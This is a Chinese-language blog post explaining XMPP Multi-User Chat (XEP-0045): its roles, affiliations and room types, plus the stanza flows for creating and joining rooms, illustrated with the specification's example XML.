<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>XMPP MUC基础 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="XMPP MUC基础" />
<meta property="og:description" content="MUC基础
概念
MUC(Multi User Chat)，XMPP在其XEP-0045扩展中定义的一个用于多用户文本会议（群聊）的协议，类似于互联网中继聊天(IRC)，提供通道或房间让大家能互相交流信息,并查看用户在线情况。
特征
1 每个参与者都可以分享消息(不包含游客Visitor)
2 每个参与者都可以获取聊天室的联系人名单
3 参与者通过昵称标识而不是真实的JabberID
4 聊天室内分享所有参与者的出席情况
5 参与者不局限于人(例:智能机器人)
名词
房间：房间的JID标识 &lt;room@service&gt;(例如：teaparty@conference. ejabberd.org)，这里 “room” 是房间的名称而 “service” 是多用户聊天服务运行所在的主机名
房客：房客的JID标识&lt;room@service/nick&gt;，nick是房客在房间的昵称
岗位：表达了用户和房间的长期关系(永久)，所有者(owner)-必须、管理者(admin)-推荐、成员(member)-推荐、排斥者(outcast)-推荐，岗位被授予，撤销，和维护都是基于用户的纯JID
角色：表达了用户和房间的临时联系，它只存在与一次访问期间(暂时)，主持人(moderator)-必须、与会者(paticipant)-必须、游客(visitor)-推荐，角色的授予，撤销，和维护是基于房客的房间昵称或全JID，而不是纯JID
岗位角色权限
1 owener：包含admin所有功能以及指定admin及销毁聊天室
2 admin：能查看会话内容、发言、踢出参与者和游客并禁止他们进入聊天室、控制他人发言的权利， 查看成员真实的JID、指定member和moderator、重新配置聊天室信息等
3 member：可加入聊天室、查看会话内容、发言（member与participant的区别在于是否注册， member是已注册的用户）
4 outcast：无法进入聊天室，被某个聊天室禁止的用户
5 moderator：能查看会话内容、发言、踢出参与者和游客、控制他人发言的权利
6 participant：即可查看会话内容又可发言
7 visitor：能进入聊天室，查看会话内容但是无法发言
房间类型
1 Hidden Room(隐藏房间) – 一个无法被任何用户以普通方法如搜索和服务查询来发现的房间; 反义词: 公开(public)房间
2 Public Room(公开房间) – 用户可以通过普通方法如搜索和服务查询来发现的房间; 反义词: 隐藏房间
3 Members-Only Room(仅限会员的房间) – 如果一个用户不在成员列表中则无法加入的一个房间; 反义词: 开放(open)房间
4 Open Room(开放房间) – 任何人可以加入而不需要在成员列表中的房间; 反义词: 仅限会员的房间" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/ee23d7976c4e6581de7cc0ae4d647f5d/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2020-07-07T15:19:31+08:00" />
<meta property="article:modified_time" content="2020-07-07T15:19:31+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">XMPP MUC基础</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>MUC基础<br> 概念<br> MUC(Multi User Chat)，XMPP在其XEP-0045扩展中定义的一个用于多用户文本会议（群聊）的协议，类似于互联网中继聊天(IRC)，提供通道或房间让大家能互相交流信息,并查看用户在线情况。<br> 特征<br> 1 每个参与者都可以分享消息(不包含游客Visitor)<br> 2 每个参与者都可以获取聊天室的联系人名单<br> 3 参与者通过昵称标识而不是真实的JabberID<br> 4 聊天室内分享所有参与者的出席情况<br> 5 参与者不局限于人(例:智能机器人)<br> 名词<br> 房间：房间的JID标识 &lt;room@service&gt;(例如：teaparty@conference. ejabberd.org)，这里 “room” 是房间的名称而 “service” 是多用户聊天服务运行所在的主机名<br> 房客：房客的JID标识&lt;room@service/nick&gt;，nick是房客在房间的昵称<br> 岗位：表达了用户和房间的长期关系(永久)，所有者(owner)-必须、管理者(admin)-推荐、成员(member)-推荐、排斥者(outcast)-推荐，岗位被授予，撤销，和维护都是基于用户的纯JID<br> 角色：表达了用户和房间的临时联系，它只存在与一次访问期间(暂时)，主持人(moderator)-必须、与会者(paticipant)-必须、游客(visitor)-推荐，角色的授予，撤销，和维护是基于房客的房间昵称或全JID，而不是纯JID<br> 岗位角色权限<br> 1 owener：包含admin所有功能以及指定admin及销毁聊天室<br> 2 admin：能查看会话内容、发言、踢出参与者和游客并禁止他们进入聊天室、控制他人发言的权利， 查看成员真实的JID、指定member和moderator、重新配置聊天室信息等<br> 3 member：可加入聊天室、查看会话内容、发言（member与participant的区别在于是否注册， member是已注册的用户）<br> 4 outcast：无法进入聊天室，被某个聊天室禁止的用户<br> 5 moderator：能查看会话内容、发言、踢出参与者和游客、控制他人发言的权利<br> 6 participant：即可查看会话内容又可发言<br> 7 visitor：能进入聊天室，查看会话内容但是无法发言<br> 房间类型<br> 1 Hidden Room(隐藏房间) – 一个无法被任何用户以普通方法如搜索和服务查询来发现的房间; 反义词: 公开(public)房间<br> 2 Public Room(公开房间) – 用户可以通过普通方法如搜索和服务查询来发现的房间; 反义词: 隐藏房间<br> 3 Members-Only Room(仅限会员的房间) – 如果一个用户不在成员列表中则无法加入的一个房间; 反义词: 开放(open)房间<br> 4 Open Room(开放房间) – 任何人可以加入而不需要在成员列表中的房间; 反义词: 仅限会员的房间<br> 5 Moderated Room(被主持的房间) – 只有有”发言权”的用户才可以发送消息给所有房客的房间; 反义词: 非主持的(Unmoderated)房间<br> 6 Unmoderated Room(非主持的房间) – 任何房客都被允许发送消息给所有房客的房间; 反义词: 被主持的房间<br> 7 Non-Anonymous Room(非匿名房间) – 一个房客的全JID会暴露给所有其他房客的房间, 尽管房客可以选择任何期望的房间昵称; 相对的是半匿名(Semi-Anonymous)房间<br> 8 Semi-Anonymous Room(半匿名房间) – 一个房客的全JID只能被房间管理员发现的房间; 相对的是非匿名(Non-Anonymous)房间<br> 9 Password-Protected Room(密码保护房间) – 一个用户必须提供正确密码才能加入的房间; 反义词: 非保密房间<br> 10 Unsecured Room(非保密房间) – 任何人不需要提供密码就可以进入的房间; 反义词: 密码保护房间<br> 11 Persistent Room(持久房间) – 如果最后一个房客退出也不会被销毁的房间; 反义词: 临时房间<br> 12 Temporary Room(临时房间) – 如果最后一个房客退出就会被销毁的房间; 反义词: 持久房间<br> XML架构协议及使用范围<br> 1 http://jabber.org/protocol/muc<br> 用户加入MUC房间，向房间服务发送出席信息<br> 用户新建MUC房间，向房间服务发送出席信息<br> 2 http://jabber.org/protocol/muc#user<br> 用户与房间服务交互(例如：简介邀请，更新出席信息发送，消息通知)<br> 3 http://jabber.org/protocol/muc#admin<br> 房间管理层操作(例如：主持人用例，管理员用例，所有者用例)<br> 4 http://jabber.org/protocol/muc#owner<br> 房间所有者特有权限操作(例如：新建房间，修改房间配置，销毁房间)<br> 5 http://jabber.org/protocol/muc#unique<br> 申请唯一房间名</p> 
<p>MUC协议分析<br> 新建房间<br> 若用户试图新建房间被拒绝访问, 服务则返回&lt;not-allowed/&gt; 错误(注：新建房间的权限可能限制在特定用户群或服务级别的管理员，)</p> 
<p style="text-indent:0;">&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='hag66@shakespeare.lit/pda'<br>     type='error'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br>   &lt;error type='cancel'&gt;<br>     &lt;not-allowed xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/presence&gt;<br><br> 若访问不受限制，则按以下步骤新建群：<br> 1 用户通过发送一个包含满足http://jabber.org/protocol/muc名字空间的空&lt;x/&gt; 子元素的出席信息到&lt;room@service/nick&gt; 声明其对MUC协议的支持<br> 2 如果用户被允许新建房间且房间不存在, 服务根据缺省配置新建此房间, 指定请求的用户作为初始房间拥有者, 并增加这个拥有者到该房间但不允许任何别的用户进入该房间，锁定房间(locking)。从房间向所有者发送包含用户状态指定信息和房间已建立(状态码201标识)的出席信息节，然后等待配置<br> 3 根据新建房间类型分为两种情况<br> a)如果初始的房间所有者想新建一个持久房间，则房间所有者发送类型为“get”包含一个遵循http://jabber.org/protocol/muc#owner名字空间的&lt;query/&gt;元素的IQ节给该房间请求房间配置 ,然后执行第4和第5步<br> b)如果初始的房间所有者想新建一个临时房间，则房间所有者发送类型为“set”遵循http://jabber.org/protocol/muc#owner名字空间并包含一个满足 ‘jabber:x:data’ 名字空间，类型为 “submit”的空的&lt;x/&gt; 元素的&lt;query/&gt;元素给该房间，然后跳到第6步<br> 4 如果房间所有者请求了一个配置表格, 服务则发送一个包含配置表格并遵循 ‘jabber:x:data’名字空间的IQ给房间拥有者，如果没有配置选项可用, 房间则返回一个空的&lt;query/&gt;元素给房间所有者<br> 5 初始的房间所有者填写配置表格(或接受缺省配置)，通过发送“set”类型并包含完整配置表格的IQ完成配置(设置一个初始化配置的超时值, 如果房间所有者再给定的超时时间内未完成房间配置，房间所有者就被假定已经接受了缺省得配置或取消了配置过程)<br> 6 若服务从初始房间所有者接收到完整准确的配置表格(或接收到了一个临时房间的请求)，服务则解锁房间(unlock)，允许其他用户进去，并发送“result”类型的IQ给房间所有者；若接收的配置表格违反一个或多个服务策略导致房间创建失败(例：密码保护房间，密码为空)，服务返回&lt;not-acceptable/&gt;错误；若服务接收到了取消(指令)，则销毁房间<br> 以下展示新建房间协议流程：<br> 首先，Jabber用户发送一个包含满足http://jabber.org/protocol/muc名字空间的空&lt;x/&gt; 子元素的出席信息到房间(寻求进入一个房间时也发送和这同样的节)</p> 
<p>&lt;presence<br>     from='crone1@shakespeare.lit/desktop'<br>     to='darkcave@chat.shakespeare.lit/firstwitch'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br> &lt;/presence&gt;<br><br> 如果该房间不存在，服务则新建这个房间(取决于关于新建房间的本地策略)，指定发出请求的用户的纯JID成为所有者，添加这个所有者到房间，并通过发送以下格式的出席信息节承认房间新建成功</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/firstwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='owner'<br>           role='moderator'/&gt;<br>     &lt;status code='110'/&gt;<br>     &lt;status code='201'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br><br> 分支a，新建临时房间：发送类型为“set”遵循http://jabber.org/protocol/muc#owner名字空间并包含一个满足 ‘jabber:x:data’ 名字空间，类型为 “submit”的空的&lt;x/&gt; 元素的&lt;query/&gt;元素给该房间</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='create1'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#owner'&gt;<br>     &lt;x xmlns='jabber:x:data' type='submit'/&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br><br> 分支b，新建持久房间：发送类型为“get”包含一个遵循http://jabber.org/protocol/muc#owner名字空间的&lt;query/&gt;元素的IQ节给该房间请求房间配置</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='create1'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='get'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#owner'/&gt;<br> &lt;/iq&gt;<br><br> 若房间不存在, 服务则返回一个初始的房间配置表单给该用户(以下是个典型实例)</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='create1'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#owner'&gt;<br>     &lt;x xmlns='jabber:x:data' type='form'&gt;<br>       &lt;title&gt;Configuration for "darkcave" Room&lt;/title&gt;<br>       &lt;instructions&gt;<br>           Your room darkcave@macbeth has been created!<br>           The default configuration is as follows:<br>             - No logging<br>             - No moderation<br>             - Up to 20 occupants<br>             - No password required<br>             - No invitation required<br>             - Room is not persistent<br>             - Only admins may change the subject<br>             - Presence broadcasted for all users<br>           To accept the default configuration, click OK. To<br>           select a different configuration, please complete<br>           this form.<br>       &lt;/instructions&gt;<br>       &lt;field<br>           type='hidden'<br>           var='FORM_TYPE'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#roomconfig&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Natural-Language Room Name'<br>           type='text-single'<br>           var='muc#roomconfig_roomname'/&gt;<br>       &lt;field<br>           label='Short Description of Room'<br>           type='text-single'<br>           var='muc#roomconfig_roomdesc'/&gt;<br>       &lt;field<br>           label='Natural Language for Room Discussions'<br>           type='text-single'<br>           var='muc#roomconfig_lang'/&gt;<br>       &lt;field<br>           label='Enable Public Logging?'<br>           type='boolean'<br>           var='muc#roomconfig_enablelogging'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Allow Occupants to Change Subject?'<br>           type='boolean'<br>           var='muc#roomconfig_changesubject'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Allow Occupants to Invite Others?'<br>           type='boolean'<br>           var='muc#roomconfig_allowinvites'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Maximum Number of Occupants'<br>           type='list-single'<br>           var='muc#roomconfig_maxusers'&gt;<br>         &lt;value&gt;20&lt;/value&gt;<br>         &lt;option label='10'&gt;&lt;value&gt;10&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='20'&gt;&lt;value&gt;20&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='30'&gt;&lt;value&gt;30&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='50'&gt;&lt;value&gt;50&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='100'&gt;&lt;value&gt;100&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='None'&gt;&lt;value&gt;none&lt;/value&gt;&lt;/option&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Roles for which Presence is Broadcast'<br>           type='list-multi'<br>           var='muc#roomconfig_presencebroadcast'&gt;<br>         &lt;value&gt;moderator&lt;/value&gt;<br>         &lt;value&gt;participant&lt;/value&gt;<br>         &lt;value&gt;visitor&lt;/value&gt;<br>         &lt;option label='Moderator'&gt;&lt;value&gt;moderator&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='Participant'&gt;&lt;value&gt;participant&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='Visitor'&gt;&lt;value&gt;visitor&lt;/value&gt;&lt;/option&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Roles and Affiliations that May Retrieve Member List'<br>           type='list-multi'<br>           var='muc#roomconfig_getmemberlist'&gt;<br>         &lt;value&gt;moderator&lt;/value&gt;<br>         &lt;value&gt;participant&lt;/value&gt;<br>         &lt;value&gt;visitor&lt;/value&gt;<br>         &lt;option label='Moderator'&gt;&lt;value&gt;moderator&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='Participant'&gt;&lt;value&gt;participant&lt;/value&gt;&lt;/option&gt;<br>         &lt;option label='Visitor'&gt;&lt;value&gt;visitor&lt;/value&gt;&lt;/option&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Make Room Publicly Searchable?'<br>           type='boolean'<br>           var='muc#roomconfig_publicroom'&gt;<br>         &lt;value&gt;1&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Make Room Persistent?'<br>           type='boolean'<br>           var='muc#roomconfig_persistentroom'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Make Room Moderated?'<br>           type='boolean'<br>           var='muc#roomconfig_moderatedroom'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Make Room Members-Only?'<br>           type='boolean'<br>           var='muc#roomconfig_membersonly'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Password Required to Enter?'<br>           type='boolean'<br>           var='muc#roomconfig_passwordprotectedroom'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field type='fixed'&gt;<br>         &lt;value&gt;<br>           If a password is required to enter this room,<br>           you must specify the password below.<br>         &lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Password'<br>           type='text-private'<br>           var='muc#roomconfig_roomsecret'/&gt;<br>       &lt;field<br>           label='Who May Discover Real JIDs?'<br>           type='list-single'<br>           var='muc#roomconfig_whois'&gt;<br>         &lt;option label='Moderators Only'&gt;<br>           &lt;value&gt;moderators&lt;/value&gt;<br>         &lt;/option&gt;<br>         &lt;option label='Anyone'&gt;<br>           &lt;value&gt;anyone&lt;/value&gt;<br>         &lt;/option&gt;<br>       &lt;/field&gt;<br>       &lt;field type='fixed'&gt;<br>         &lt;value&gt;<br>           You may specify additional people who have<br>           administrative privileges in the room. Please<br>           provide one Jabber ID per line.<br>         &lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Room Admins'<br>           type='jid-multi'<br>           var='muc#roomconfig_roomadmins'/&gt;<br>       &lt;field type='fixed'&gt;<br>         &lt;value&gt;<br>           You may specify additional owners for this<br>           room. Please provide one Jabber ID per line.<br>         &lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field<br>           label='Room Owners'<br>           type='jid-multi'<br>           var='muc#roomconfig_roomowners'/&gt;<br>     &lt;/x&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br><br> 注意：_whois 配置选项指定该房间是非匿名的(值为“anyone”)，半匿名的(值为“moderators”)，还是全匿名的(值为“none”，不显示在这)<br> 若没有配置选项，则服务返回空的&lt;query/&gt;元素给房间所有者</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='create1'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#owner'/&gt;<br> &lt;/iq&gt;<br><br> 房间所有者填写完成表单返回提交给服务</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='create2'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#owner'&gt;<br>     &lt;x xmlns='jabber:x:data' type='submit'&gt;<br>       &lt;field var='FORM_TYPE'&gt;<br>         &lt;value&gt;http://jabber.org/protocol/muc#roomconfig&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_roomname'&gt;<br>         &lt;value&gt;A Dark Cave&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_roomdesc'&gt;<br>         &lt;value&gt;The place for all good witches!&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_enablelogging'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_changesubject'&gt;<br>         &lt;value&gt;1&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_allowinvites'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_maxusers'&gt;<br>         &lt;value&gt;10&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_publicroom'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_persistentroom'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_moderatedroom'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_membersonly'&gt;<br>         &lt;value&gt;0&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_passwordprotectedroom'&gt;<br>         &lt;value&gt;1&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_roomsecret'&gt;<br>         &lt;value&gt;cauldronburn&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_whois'&gt;<br>         &lt;value&gt;moderators&lt;/value&gt;<br>       &lt;/field&gt;<br>       &lt;field var='muc#roomconfig_roomadmins'&gt;<br>         &lt;value&gt;wiccarocks@shakespeare.lit&lt;/value&gt;<br>         &lt;value&gt;hecate@shakespeare.lit&lt;/value&gt;<br>       &lt;/field&gt;<br>     &lt;/x&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br><br> 若房间创建成功，服务通知所有者房间新建成功</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='create2'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'/&gt;<br><br> 若制定房间配置违反一个或多个服务策略导致房间创建失败(例：密码保护房间，密码为空)，服务返回&lt;not-acceptable/&gt;错误</p> 
<p>&lt;iq from='darkcave@chat.shakespeare.lit'<br>     id='create2'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='error'&gt;<br>   &lt;error type='modify'&gt;<br>     &lt;not-acceptable xmlns='urn:ietf:params:xml:ns:xmpp-stanzas'/&gt;<br>   &lt;/error&gt;<br> &lt;/iq&gt;<br><br> 此外，用户取消初始房间配置</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='create2'<br>     to='darkcave@chat.shakespeare.lit'<br>     type='set'&gt;<br>   &lt;query xmlns='http://jabber.org/protocol/muc#owner'&gt;<br>     &lt;x xmlns='jabber:x:data' type='cancel'/&gt;<br>   &lt;/query&gt;<br> &lt;/iq&gt;<br><br> 若用户取消房间初始配置或提交表单前失去连接(确保发送不可用出席信息给房间所有者)，服务则销毁房间<br> 延伸-申请唯一房间名(避免可能的房间冲突)<br> 房间创建者通过发送一个包含一个空&lt;unique/&gt; 元素，并遵循 http://jabber.org/protocol/muc#unique‘名字空间的IQ-get给服务本身来请求唯一房间名</p> 
<p>&lt;iq from='crone1@shakespeare.lit/desktop'<br>     id='unique1'<br>     to='chat.shakespeare.lit'<br>     type='get'&gt;<br>   &lt;unique xmlns='http://jabber.org/protocol/muc#unique'/&gt;<br> &lt;/iq&gt;<br><br> 如果服务支持这个特性, 则以XML字符数据的方式返回一个唯一房间名，包含一个 &lt;unique/&gt; 元素 (但不创建该房间)</p> 
<p>&lt;iq from='chat.shakespeare.lit'<br>     id='unique1'<br>     to='crone1@shakespeare.lit/desktop'<br>     type='result'&gt;<br>   &lt;unique xmlns='http://jabber.org/protocol/muc#unique'&gt;<br>     6d9423a55f499b29ad20bf7b2bdea4f4b885ead1<br>   &lt;/unique&gt;<br> &lt;/iq&gt;<br><br> 服务可使用算法保证房间名的创建在服务上下文中是唯一的(例：对发出的请求JID，datetime和random salt的SHA-1哈希运算)<br> 房间创建者接着使用XML字符数据&lt;unique/&gt;元素作为它请求房间JID的节点标识符(ID)</p> 
<p>&lt;presence <br>     from='crone1@shakespeare.lit/desktop'<br>     to='6d9423a55f499b29ad20bf7b2bdea4f4b885ead1@chat.shakespeare.lit/firstwitch'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br> &lt;/presence&gt;<br><br> 加入房间<br> 主动加入-申请<br> 用户客户端直接向需加入房间发送出席信息和用户昵称(若用户存在保留的房间昵称，则会在加入房间前优先查询保留昵称)，加入房间后交换出席信息(房间类型为Multi-User Chat，不是Groupchat 1.0)，然后服务向新房客发送讨论历史<br> 加入流程：<br> 申请用户直接向需加入房间发送包含满足http://jabber.org/protocol/muc名字空间的&lt;x/&gt;元素(声明用户客户端支持MUC协议)的出席信息和用户昵称</p> 
<p>&lt;presence<br>     from="hag66@shakespeare.lit/pda"<br>     to='darkcave@macbeth.shakespeare.lit/thirdwitch'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc'/&gt;<br> &lt;/presence&gt;<br><br> 若用户加入房间发生错误，则需返回包含MUC子元素的&lt;presence/&gt;节，其type为“error”类型(详见主动加入房间异常情况)<br> 若服务能够添加用户到房间, 则会从所有现存的房客的房间JID发送出席信息给新的房客的全JID, 包括扩展的关于角色的出席信息, 一个满足 http://jabber.org/protocol/muc#user名字空间的 元素并包含一个&lt;item/&gt;子元素, 这个子元素的role属性值设为“moderator”,“participant”，或“visitor”，这个子元素的affiliation属性值设为“owner”，“admin”，“member”，或 “none”中的一个：</p> 
<p>&lt;presence<br>     from='darkcave@macbeth.shakespeare.lit/firstwitch'<br>     to='hag66@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='owner' role='moderator'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br> &lt;presence<br>     from='darkcave@macbeth.shakespeare.lit/secondwitch'<br>     to='hag66@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='admin' role='moderator'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br><br> 以上示例表示, 用户进入房间中已有两人存在： 一个是昵称为“firstwitch”(房间拥有者)，另一个是昵称为“secondwitch”(房间管理员)。接下来服务从新加入房客房间JID向所有房客发送出息信息(包括新房客自身)</p> 
<p>&lt;presence<br>     from='darkcave@macbeth.shakespeare.lit/thirdwitch'<br>     to='crone1@shakespeare.lit/desktop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member' role='participant'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;</p> 
<p>&lt;presence<br>     from='darkcave@macbeth.shakespeare.lit/thirdwitch'<br>     to='wiccarocks@shakespeare.lit/laptop'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member' role='participant'/&gt;<br>   &lt;/x&gt;</p> 
<p>&lt;/presence&gt;</p> 
<p>&lt;presence<br>     from='darkcave@macbeth.shakespeare.lit/thirdwitch'<br>     to='hag66@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member' role='participant'/&gt;<br>     &lt;status code='110'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br><br> 以上示例表示由房间代新房客发送出席信息给房客自身时，需额外添加一个110状态码，标识出席信息来自自己，此外，若房间讨论是被记录到公开存档的，服务同时会警告用户记录已被记录，并将房间发送给用户的初始出席信息中包含一个状态码170）</p> 
<p>&lt;presence<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='hag66@shakespeare.lit/pda'&gt;<br>   &lt;x xmlns='http://jabber.org/protocol/muc#user'&gt;<br>     &lt;item affiliation='member' role='participant'/&gt;<br>     &lt;status code='100'/&gt;<br>     &lt;status code='110'/&gt;<br>     &lt;status code='170'/&gt;<br>     &lt;status code='210'/&gt;<br>   &lt;/x&gt;<br> &lt;/presence&gt;<br><br> 如上发送完初始出席信息后，服务将历史信息发送给新房客(历史是否发送，发送消息条目，皆有聊天服务部署决定)，讨论历史消息满足urn:xmpp:delay名称空间，表示该消息为延迟发送并标明发送时间(用户进入房间接收即时信息，必须在完成历史消息接收后)</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit/firstwitch'<br>     to='hecate@shakespeare.lit/broom'<br>     type='groupchat'&gt;<br>   &lt;body&gt;Thrice the brinded cat hath mew'd.&lt;/body&gt;<br>   &lt;delay xmlns='urn:xmpp:delay'<br>      from='crone1@shakespeare.lit/desktop'<br>      stamp='2002-10-13T23:58:37Z'/&gt;<br> &lt;/message&gt;</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit/secondwitch'<br>     to='hecate@shakespeare.lit/broom'<br>     type='groupchat'&gt;<br>   &lt;body&gt;Thrice and once the hedge-pig whined.&lt;/body&gt;<br>   &lt;delay xmlns='urn:xmpp:delay'<br>      from='wiccarocks@shakespeare.lit/laptop'<br>      stamp='2002-10-13T23:58:43Z'/&gt;<br> &lt;/message&gt;</p> 
<p>&lt;message<br>     from='darkcave@chat.shakespeare.lit/thirdwitch'<br>     to='hecate@shakespeare.lit/broom'<br>     type='groupchat'&gt;<br>   &lt;body&gt;Harpier cries 'Tis time, 'tis time.&lt;/body&gt;<br>   &lt;delay xmlns='urn:xmpp:delay'<br>      from='hag66@shakespeare.lit/pda'<br>      stamp='2002-10-13T23:58:49Z'/&gt;<br> &lt;/message&gt;<br><br> 注意：发送给新房客的出席信息顺序很重要， 服务需先发送现有房客的完整列表给这个新房客，然后单发新房客自己的出席信息给新房客。这有助于客户端知道什么时候它收到了完整的房间名册( “room roster”)。发送出席信息广播之后(并且只在这之后)，服务才可以发送讨论历史，即时消息，出席信息更新，以及其他房间内的流量</p> 
